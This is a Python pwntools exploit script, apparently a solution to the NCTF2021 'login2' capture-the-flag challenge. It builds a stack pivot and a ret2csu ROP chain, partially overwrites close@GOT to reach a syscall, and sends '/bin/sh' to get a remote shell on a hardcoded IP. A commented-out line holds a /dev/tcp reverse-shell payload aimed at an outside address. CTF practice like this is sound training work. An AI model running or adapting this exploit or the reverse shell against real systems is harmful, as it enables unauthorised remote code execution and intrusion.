from pwn import *

#context.log_level='debug'
#p = remote('xray.wwb.email',8000)
p = remote('129.211.173.64',10005)
#p = remote('127.0.0.1',8000)
#p = process('./logins')
e = ELF('./login2')
bss_addres = 0x404300
close = e.got['close']

def csu(fun,arg1,arg2,arg3):
    Payloads = p64(0x0) #rbx=0
    Payloads+= p64(0x1) #rbp=1 enable not to jump
    Payloads+= p64(arg1) #edi
    Payloads+= p64(arg2) #rsi
    Payloads+= p64(arg3) #rdx
    Payloads+= p64(fun)  #func
    Payloads+= p64(0x401270)#ret
    Payloads+= b'a'*8
    return Payloads

p.recvuntil('Welcome to NCTF2021!')
input()
#read(0,bssAddr+100h,110h) rsp=rbp=bssAddr 
p.send(cyclic(256)+p64(bss_addres)+p64(0x4011ed))#rbp1 ret1
input()
payload = p64(bss_addres)#rbp3
payload+= p64(0x40128a) #ret3 csu 
payload+=csu(e.got['read'],0,e.got['close'],1)
#payload+=csu(e.got['read'],0,bss_addres-0x100+0x90,0x100)#read payload2
payload+=csu(e.got['read'],0,0x404410,59)  #/bin/sh
payload+=csu(e.got['close'],0x404410,0,0) #getshell
print(len(payload))
payload =payload.ljust(256,b'\x00')

payload+= p64(bss_addres - 0x100)#rbp2
payload+= p64(0x40121f)#ret2
p.send(payload)
input()

p.send(b'\x85')
#p.send(b'\x8f')#close=>ret
#sleep(0.3)


#payload2 =p64(0x0)+p64(0x1)+p64(0x0)*4+p64(0x40119a)#main
#payload2 =csu(e.got['__gmon_start__'],0,0,0)
#payload2+= p64(0x40128a)#ret csu
#payload2+=csu(e.got['read'],0,e.got['close'],1)
#payload2+=csu(e.got['read'],0,0x404410,59)  #/bin/sh
#payload2+=csu(e.got['close'],0x404410,0,0) #getshell
#p.send(payload2)

#input()
#sleep(0.3)
#p.send('aaaaa\n')


#payload2 = csu(e.got['read'],0,0x404410,59)
#payload2+= csu(e.got['read'],0,0x404420,59)
#payload2+= csu(e.got['close'],0x404410,0,0)
#p.send(payload2)

input()
sleep(0.3)
p.send(b'/bin/sh\x00'.ljust(59,b'\x00'))
sleep(0.3)
#p.send(b'-i >& /dev/tcp/42.192.190.210/8000 0>&1'.ljust(59,b'\x00'))
#sleep(0.3)
p.interactive()
